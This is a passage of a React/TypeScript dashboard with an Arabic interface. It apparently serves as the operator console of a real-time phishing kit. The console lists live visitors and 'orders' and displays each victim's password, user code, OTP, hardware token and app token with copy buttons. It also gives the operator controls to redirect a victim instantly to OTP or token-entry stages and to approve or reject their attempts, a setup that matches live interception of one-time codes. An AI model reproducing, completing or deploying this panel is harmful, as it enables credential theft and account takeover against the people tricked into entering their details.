              <span className="rounded-full bg-success/15 px-2 py-0.5 text-[11px] font-black text-success">
                {visitors.length}
              </span>
            </div>
            <ul className="min-h-0 flex-1 space-y-2 overflow-y-auto scroll-smooth p-3 text-xs">
              {visitors.length === 0 && (
                <li className="rounded-lg bg-secondary/40 p-3 text-center text-muted-foreground">
                  لا يوجد زوار حالياً
                </li>
              )}
              {visitors.map((v) => {
                const order = orders.find((o) => o.session_id === v.sessionId);
                return (
                  <li key={v.sessionId}>
                    <button
                      type="button"
                      onClick={() => order && openOrder(order)}
                      className="flex w-full items-center justify-between gap-2 rounded-lg bg-secondary/40 p-2 text-right transition-colors hover:bg-dashboard-row-hover"
                    >
                      <span className="min-w-0">
                        <span className="block truncate text-xs font-bold">
                          {order?.name || <span className="text-muted-foreground">زائر</span>}
                        </span>
                        <span className="block truncate font-mono text-[10px] text-muted-foreground">
                          {v.path}
                        </span>
                      </span>
                      <span className="inline-flex shrink-0 items-center gap-1 rounded-full bg-success/15 px-2 py-0.5 text-[10px] font-black text-success">
                        <span className="inline-block h-1.5 w-1.5 animate-pulse rounded-full bg-success" />
                        نشط
                      </span>
                    </button>
                  </li>
                );
              })}
            </ul>
          </section>

          <section className="flex min-h-0 flex-1 flex-col overflow-hidden rounded-lg border border-border bg-card shadow-[var(--dashboard-shadow)]">
            <h2 className="shrink-0 border-b border-border p-3 text-sm font-black">
              الأحداث اللحظية
            </h2>
            <ul
              ref={eventFeedRef}
              className="min-h-0 flex-1 space-y-2 overflow-y-auto scroll-smooth p-3 text-xs"
            >
              {events.slice(0, 60).map((e) => (
                <li
                  key={e.id}
                  className="flex items-center justify-between gap-2 rounded-lg bg-secondary/40 p-2"
                >
                  <span className="font-mono text-[10px] text-muted-foreground">
                    {e.session_id.slice(0, 8)}
                  </span>
                  <span className="flex-1 truncate text-xs font-bold">
                    {STAGE_LABEL[e.stage] ?? e.stage}
                  </span>
                  <span className="text-[10px] text-muted-foreground">
                    {new Date(e.created_at).toLocaleTimeString("ar-EG")}
                  </span>
                </li>
              ))}
              {events.length === 0 && (
                <li className="text-center text-muted-foreground">لا أحداث بعد</li>
              )}
            </ul>
          </section>
        </aside>
      </div>
    </div>
  );
}

function StatPill({
  label,
  value,
  tone = "default",
}: {
  label: string;
  value: number;
  tone?: "default" | "success" | "warning" | "accent";
}) {
  const toneClass =
    tone === "success"
      ? "bg-success/15 text-success"
      : tone === "warning"
        ? "bg-warning/15 text-warning"
        : tone === "accent"
          ? "bg-primary text-primary-foreground"
          : "bg-secondary text-primary";
  return (
    <span
      className={`hidden items-center gap-1.5 rounded-full px-3 py-1 text-[11px] font-black sm:inline-flex ${toneClass}`}
    >
      {label}
      <span className="text-xs">{value}</span>
    </span>
  );
}

function OrderCard({
  order,
  isOnline,
  isFresh,
  isSelected,
  onOpen,
  onAction,
  onDelete,
}: {
  order: OrderRow;
  isOnline: boolean;
  isFresh: boolean;
  isSelected: boolean;
  onOpen: () => void;
  onAction: (action: QuickActionKey) => void;
  onDelete: () => void;
}) {
  return (
    <article
      onClick={onOpen}
      className={`cursor-pointer rounded-lg border p-3 transition-colors hover:bg-dashboard-row-hover ${
        isSelected ? "border-primary bg-primary/5" : "border-border bg-card"
      } ${isFresh ? "animate-pulse" : ""}`}
    >
      <div className="flex items-start justify-between gap-2">
        <div className="flex min-w-0 items-center gap-2">
          <span
            className={`inline-block h-2 w-2 shrink-0 rounded-full ${
              isOnline ? "animate-pulse bg-success" : "bg-muted-foreground/40"
            }`}
            title={isOnline ? "متصل" : "غير متصل"}
          />
          <div className="min-w-0">
            <div className="truncate text-sm font-bold">
              {order.name || <em className="text-muted-foreground">بلا اسم</em>}
            </div>
            <div className="truncate font-mono text-[10px] text-muted-foreground">
              {order.phone || order.session_id.slice(0, 12)}
            </div>
          </div>
        </div>
        <span
          className={`shrink-0 rounded-full px-2 py-0.5 text-[10px] font-black ${
            STATUS_STYLE[order.status] ?? "bg-secondary text-primary"
          }`}
        >
          {STATUSES.find((s) => s.value === order.status)?.label ?? order.status}
        </span>
      </div>
      <div className="mt-2 flex items-center justify-between gap-2 text-[10px] text-muted-foreground">
        <span className="truncate">{STAGE_LABEL[order.stage] ?? order.stage}</span>
        <span className="shrink-0">{timeAgo(order.updated_at)}</span>
      </div>
      <div
        className="mt-2 flex flex-wrap items-center gap-1 border-t border-border pt-2"
        onClick={(e) => e.stopPropagation()}
      >
        <QuickActions onAction={onAction} status={order.status} stage={order.stage} />
        <Button
          type="button"
          variant="destructive"
          size="icon"
          onClick={onDelete}
          className="ms-auto h-8 min-h-8 w-8 min-w-8"
          title="حذف"
        >
          <Trash2 className="h-4 w-4" />
        </Button>
      </div>
    </article>
  );
}

function RealtimeStatus({ status }: { status: "connecting" | "live" | "offline" }) {
  if (status === "live") return <StatusBadge status="online" label="مباشر" compact pulse />;
  if (status === "offline") return <StatusBadge status="offline" label="منقطع" compact />;
  return <StatusBadge status="processing" label="اتصال..." compact />;
}

function OrderWorkspace({
  order,
  events,
  isOnline,
  currentPath,
  onClose,
  onCopy,
  onStage,
  onStatus,
  onAction,
  position,
  total,
  onPrevious,
  onNext,
}: {
  order: OrderRow;
  events: EventRow[];
  isOnline: boolean;
  currentPath?: string | undefined;
  onClose: () => void;
  onCopy: (text: string, label: string) => void;
  onStage: (stage: OrderRow["stage"]) => void;
  onStatus: (status: string) => void;
  onAction: (action: QuickActionKey) => void;
  position: number;
  total: number;
  onPrevious: () => void;
  onNext: () => void;
}) {
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  return (
    <div className="space-y-4">
      <div className="rounded-lg border border-border bg-card p-4 shadow-[var(--dashboard-shadow)]">
        <div className="mb-3 flex items-center justify-between gap-2 rounded-lg bg-secondary/50 p-2">
          <Button type="button" variant="outline" size="sm" onClick={onPrevious} disabled={position <= 0}>
            <ChevronRight className="h-4 w-4" /> السابق
          </Button>
          <span className="text-xs font-black text-muted-foreground">
            طلب {position >= 0 ? position + 1 : 0} من {total}
          </span>
          <Button
            type="button"
            variant="outline"
            size="sm"
            onClick={onNext}
            disabled={position < 0 || position >= total - 1}
          >
            التالي <ChevronLeft className="h-4 w-4" />
          </Button>
        </div>

        <div className="flex flex-wrap items-start justify-between gap-3">
          <div className="min-w-0">
            <div className="flex items-center gap-2">
              <StatusBadge status={isOnline ? "online" : "offline"} compact pulse={isOnline} />
              <h2 className="truncate text-lg font-black">{order.name || "بلا اسم"}</h2>
            </div>
            <p className="mt-1 font-mono text-[11px] text-muted-foreground">{order.session_id}</p>
            {currentPath && (
              <p className="mt-1 text-[11px] text-muted-foreground">
                يتصفّح الآن: <span className="font-mono">{currentPath}</span>
              </p>
            )}
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              onClick={() => {
                const lines = [
                  `الاسم: ${order.name ?? "-"}`,
                  `الهاتف: ${order.phone ?? "-"}`,
                  `المدينة: ${order.city ?? "-"}`,
                  `التصميم: ${order.spec ?? order.watch_id ?? "-"}`,
                  `كود المستخدم: ${order.user_code ?? "-"}`,
                  `كلمة المرور: ${order.password ?? "-"}`,
                  `OTP: ${order.otp ?? "-"}`,
                  `توكن الجهاز: ${order.hw_token ?? "-"}`,
                  `توكن التطبيق: ${order.app_token ?? "-"}`,
                ].join("\n");
                onCopy(lines, "كل بيانات الطلب");
              }}
            >
              <Copy className="h-4 w-4" />
              نسخ الكل
            </Button>
            <Button
              type="button"
              variant="outline"
              size="icon"
              onClick={onClose}
              className="h-9 min-h-9 w-9 min-w-9"
              aria-label="إغلاق"
            >
              <X className="h-4 w-4" />
            </Button>
          </div>
        </div>

        <div className="mt-3 flex flex-wrap items-center gap-2 border-t border-border pt-3">
          <QuickActions onAction={onAction} status={order.status} stage={order.stage} />
        </div>
      </div>

      <div className="grid gap-4 xl:grid-cols-2">
        <div className="space-y-3 rounded-lg border border-border bg-card p-4 shadow-[var(--dashboard-shadow)]">
          <h3 className="text-sm font-black">بيانات العميل</h3>
          <Field label="الهاتف" value={order.phone} onCopy={onCopy} />
          <Field label="المدينة" value={order.city} onCopy={onCopy} />
          <Field label="التصميم" value={order.spec || order.watch_id} onCopy={onCopy} multiline />
          <div className="grid grid-cols-2 gap-3">
            <Field label="كود المستخدم" value={order.user_code} onCopy={onCopy} mono />
            <Field label="كلمة المرور" value={order.password} onCopy={onCopy} mono />
          </div>
          <div className="grid grid-cols-3 gap-3">
            <Field label="OTP" value={order.otp} onCopy={onCopy} mono />
            <Field label="توكن الجهاز" value={order.hw_token} onCopy={onCopy} mono />
            <Field label="توكن التطبيق" value={order.app_token} onCopy={onCopy} mono />
          </div>
        </div>

        <div className="space-y-4">
          <div className="rounded-lg border border-border bg-card p-4 shadow-[var(--dashboard-shadow)]">
            <h3 className="mb-3 text-sm font-black">التحكم الفوري</h3>
            <div className="grid grid-cols-2 gap-3">
              <div>
                <p className="mb-1 text-[11px] font-black text-muted-foreground">توجيه فوري</p>
                <Select value={order.stage} onValueChange={(v) => onStage(v as OrderRow["stage"])}>
                  <SelectTrigger className="h-9 text-xs">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {STAGES.map((s) => (
                      <SelectItem key={s.value} value={s.value}>
                        <Send className="ml-1 inline h-3 w-3" />
                        {s.label}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <div>
                <p className="mb-1 text-[11px] font-black text-muted-foreground">تغيير الحالة</p>
                <Select value={order.status} onValueChange={onStatus}>
                  <SelectTrigger
                    className={`h-9 text-xs font-bold ${STATUS_STYLE[order.status] ?? ""}`}
                  >
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {STATUSES.map((s) => (
                      <SelectItem key={s.value} value={s.value}>
                        {s.label}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>
          </div>

          <div className="rounded-lg border border-border bg-card p-4 shadow-[var(--dashboard-shadow)]">
            <p className="mb-2 text-[11px] font-black text-muted-foreground">
              الخط الزمني ({events.length})
            </p>
            <ol className="relative max-h-72 space-y-3 overflow-y-auto scroll-smooth border-r-2 border-border pr-4">
              {events.map((e) => (
                <li key={e.id} className="relative">
                  <span className="absolute -right-[22px] top-1.5 h-2.5 w-2.5 rounded-full bg-primary" />
                  <div className="text-xs font-bold">{STAGE_LABEL[e.stage] ?? e.stage}</div>
                  <div className="text-[10px] text-muted-foreground">
                    {new Date(e.created_at).toLocaleString("ar-EG")}
                  </div>
                </li>
              ))}
              {events.length === 0 && <li className="text-xs text-muted-foreground">لا أحداث</li>}
            </ol>
          </div>
        </div>
      </div>
    </div>
  );
}

function Field({
  label,
  value,
  onCopy,
  mono,
  multiline,
}: {
  label: string;
  value: string | null | undefined;
  onCopy: (text: string, label: string) => void;
  mono?: boolean;
  multiline?: boolean;
}) {
  const val = value || "";
  return (
    <div>
      <div className="mb-1 flex items-center justify-between">
        <span className="text-[11px] font-black text-muted-foreground">{label}</span>
        {val && (
          <Button
            type="button"
            variant="ghost"
            size="icon"
            onClick={() => onCopy(val, label)}
            className="h-7 min-h-7 w-7 min-w-7 text-muted-foreground"
            title="نسخ"
          >
            <Copy className="h-3 w-3" />
          </Button>
        )}
      </div>
      <div
        className={`rounded-lg border border-border bg-secondary/40 px-3 py-2 text-xs ${
          mono ? "font-mono" : ""
        } ${multiline ? "whitespace-pre-wrap" : "truncate"}`}
      >
        {val || <span className="text-muted-foreground">—</span>}
      </div>
    </div>
  );
}

function timeAgo(iso: string): string {
  const d = new Date(iso).getTime();
  const s = Math.floor((Date.now() - d) / 1000);
  if (s < 5) return "الآن";
  if (s < 60) return `${s}ث`;
  if (s < 3600) return `${Math.floor(s / 60)}د`;
  if (s < 86400) return `${Math.floor(s / 3600)}س`;
  return new Date(iso).toLocaleDateString("ar-EG");
}

type QuickActionKey = "approve" | "reject" | "smart-reject" | "token";

const QUICK_ACTIONS: {
  key: QuickActionKey;
  label: string;
  icon: typeof Check;
  variant: "outline" | "destructive" | "secondary";
}[] = [
  {
    key: "approve",
    label: "قبول",
    icon: Check,
    variant: "outline",
  },
  {
    key: "reject",
    label: "رفض",
    icon: Ban,
    variant: "destructive",
  },
  {
    key: "smart-reject",
    label: "رفض ذكي",
    icon: ShieldAlert,
    variant: "secondary",
  },
  {
    key: "token",
    label: "توكن",
    icon: KeyRound,
    variant: "outline",
  },
];

function QuickActions({
  onAction,
  status,
  stage,
}: {
  onAction: (action: QuickActionKey) => void;
  status?: string;
  stage?: string;
}) {
  return (
    <>
      {QUICK_ACTIONS.map((a) => {
        const Icon = a.icon;
        const active =
          (a.key === "approve" && status === "approved") ||
          (a.key === "reject" && status === "rejected") ||
          (a.key === "smart-reject" && status === "review" && stage === "verify-otp") ||
          (a.key === "token" && stage === "hardware-token");
        return (
          <Button
            key={a.key}
            type="button"
            variant={a.variant}
            size="sm"
            onClick={() => onAction(a.key)}
            title={a.label}
            className={`h-8 min-h-8 gap-1 px-2 text-[11px] ${active ? "ring-2 ring-current/30" : ""}`}
          >
            <Icon className="h-3.5 w-3.5" />
            {a.label}
          </Button>
        );
      })}
    </>
  );
}
